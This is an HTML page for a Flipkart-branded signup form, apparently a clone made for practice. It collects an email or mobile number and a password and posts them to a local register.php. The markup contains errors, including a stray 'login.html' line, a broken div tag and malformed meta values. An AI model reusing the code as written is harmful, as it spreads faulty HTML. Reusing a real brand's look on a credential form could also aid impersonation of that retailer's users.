<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-edge">
    login.html
    <meta name="viewport" content="width-device-width, initial-scale-1.0">
    <title>Flipkart-signup</title>
    <link rel="icon" href="\img\flipkart icon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gs9baDl411NQApFmC26EWAOH8WgZ15MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" href="login-style.css"/>
</head>
<body>
    <form class="container" action="register.php"  method="POST">
        <div class="box">
            <div class="row">
                <di v class="col-sm-5 col-xs-1 box1">
                    <div class="inline-text">
                        <h1>Looks like you are
                            new here!</h1>
                        <p>
                            Sign up with your mobile number to get started!!
                        </p>
                    </div>
                </div>
                <div class="box-2">
                    <div class="user-id user-data">
                        <input type="email" name="email" id="email" required=""/>
                        <label>Enter email/Mobile Number</label>
                    </div>
                    <div class="user-id user-data">
                        <input type="password" name="passwd" id="passwd" required=""/>
                        <label>Enter Password</label>
                    </div>
                    <div class="user-id">
                        <p>By continuing, you agree to Flipkarts Term of use and Privacy Policy.</p>
                    </div>
                    <div class="user-id button">
                        <input type="submit" name="" id="" value="Continue">
                    </div>
                    <!-- <div class="user-id button">
                        <input type="submit" name="" id="" value="Exsisting User? Log In" />
                    </div> -->
                    <div class="user-id">
                        <p class="footer"><a href="#">New to Flipkart? Create an account<a></p>
                    </div>
                </div>
            </div>
        </div>
    </form>
</body>
</html>
